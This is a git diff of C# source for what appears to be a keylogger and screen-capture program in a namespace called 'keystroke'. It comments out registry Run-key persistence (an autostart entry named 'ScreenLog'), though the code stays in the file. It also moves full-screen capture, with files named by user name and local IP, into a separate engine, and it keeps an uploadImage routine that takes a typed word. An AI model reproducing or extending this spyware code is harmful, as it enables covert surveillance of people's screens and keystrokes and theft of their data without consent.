@@ -15,6 +15,8 @@ using System.IO;
 using WebUtils;
 using Microsoft.Win32;
 
+using engine;
+
 namespace keystroke
 {
     static class Program
@@ -43,16 +45,16 @@ namespace keystroke
 
             try
             {
-                RegistryKey read = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", false);
-                object currentValue = read.GetValue("ScreenLog");
+                //RegistryKey read = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", false);
+                //object currentValue = read.GetValue("ScreenLog");
 
-                string val = currentValue.ToString();
-                string exe_path = Application.ExecutablePath;
-                if (currentValue == null || val != exe_path)
-                {
-                    RegistryKey add = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-                    add.SetValue("ScreenLog", Application.ExecutablePath);
-                }
+                //string val = currentValue.ToString();
+                //string exe_path = Application.ExecutablePath;
+                //if (currentValue == null || val != exe_path)
+                //{
+                //    RegistryKey add = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+                //    add.SetValue("ScreenLog", Application.ExecutablePath);
+                //}
 
                 //if (currentValue == null || String.Compare(val, Application.ExecutablePath, true) != 0)
                 //{
@@ -145,30 +147,10 @@ namespace keystroke
 
         private static string takeScreenshot()
         {
-            Bitmap memoryImage;
-
             int screenWidth = Screen.PrimaryScreen.Bounds.Width;
             int screenHeight = Screen.PrimaryScreen.Bounds.Height;
 
-            memoryImage = new Bitmap(screenWidth, screenHeight);
-            Size s = new Size(memoryImage.Width, memoryImage.Height);
-
-            Graphics memoryGraphics = Graphics.FromImage(memoryImage);
-
-            memoryGraphics.CopyFromScreen(0, 0, 0, 0, s);
-
-            string urName = System.Environment.UserName;
-            string ipAddr = GetLocalIPAddress();
-            //That's it! Save the image in the directory and this will work like charm.  
-            string fileName = string.Format(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) +
-                      @"\Screenshot" + "_" + urName + "_" + ipAddr + "_" +
-                      DateTime.Now.ToString("(dd_MMM_yyyy_hh_mm_ss_tt)") + ".png");
-
-
-            // save it  
-            memoryImage.Save(fileName);
-
-            return fileName;
+            return Engine.takeScreenshot(screenWidth, screenHeight);
         }
 
         private static void uploadImage(string path, string username, string ipaddr, string word)
